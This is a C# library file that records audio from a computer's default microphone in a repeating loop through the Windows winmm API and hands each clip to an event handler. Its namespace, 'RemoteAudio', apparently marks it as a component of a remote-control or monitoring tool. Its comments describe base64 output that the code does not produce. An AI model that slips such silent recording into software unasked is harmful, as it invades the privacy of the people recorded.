/*
 * Application: AudioCapture Library
 * 
 * Description:
 * Creates a object with the ability to record audio from the default audio recoding device on a computer.
 * the clips are saved and a event will be risin giving your the audio capture in a base64 string encoded format.
 * To play the audio decode the string into a byte away and play the stream of bytes or save the bytes as a .wav file
 * 
 * Version: 1.0
 */
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;

namespace CORE.RemoteAudio
{
    public class AudioCapture
    {
        //The delay used between, captures 
        public int Delay;
        //Determine if its time to capture or not 
        private bool EnableCapture = false;
        //The output path 
        string output;
        //The thread to capture on 
        Thread CaptureThread;

        /// <summary>
        /// Creates a new AudioCapture Instance 
        /// </summary>
        /// <param name="delay">The delay used between capturing snippets</param>
        public AudioCapture(int delay)
        {
            this.Delay = delay;
            output = Path.GetTempFileName();
        }
        /// <summary>
        /// Start capturing audio 
        /// </summary>
        public void Start()
        {
            if (!EnableCapture)
            {
                EnableCapture = true;
                CaptureThread = new Thread(Capture);
                CaptureThread.Start();
            }
        }
        /// <summary>
        /// The thread in which the audio is captured on 
        /// </summary>
        private void Capture()
        {
            while (EnableCapture)
            {
                try
                {
                    //Close Old Captures 
                    mciSendString("close recsound", "", 0, 0);
                    //Create New Capture
                    mciSendString("open new Type waveaudio Alias recsound", "", 0, 0);
                    mciSendString("record recsound", "", 0, 0);
                    //Wait For Delay
                    Thread.Sleep(Delay);
                    //Save Recording
                    mciSendString("save recsound " + output, "", 0, 0);
                    BitCaptured(File.ReadAllBytes(output));
                }
                catch { }
            }
        }
        /// <summary>
        /// Stop the audio capture. 
        /// </summary>
        public void Stop()
        {
            EnableCapture = false;
            mciSendString("close recsound", "", 0, 0);
            try
            {
                if (CaptureThread.IsAlive)
                {
                    CaptureThread.Abort();
                }
            }
            catch { }
            try
            {
                if (File.Exists(output))
                    File.Delete(output);
            }
            catch { }
        }
        /// <summary>
        /// New Bit Captured from audio 
        /// </summary>
        /// <param name="Caputre">The audio (.wav) encoded as a base 64 string </param>
        public delegate void BitCapturedHandle(byte[] Capture);
        public event BitCapturedHandle BitCaptured;
        #region NativeAPI
        //API's
        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, string lpstrReturnString, int bufferSize, int hwndCallback);
        #endregion
    }
}
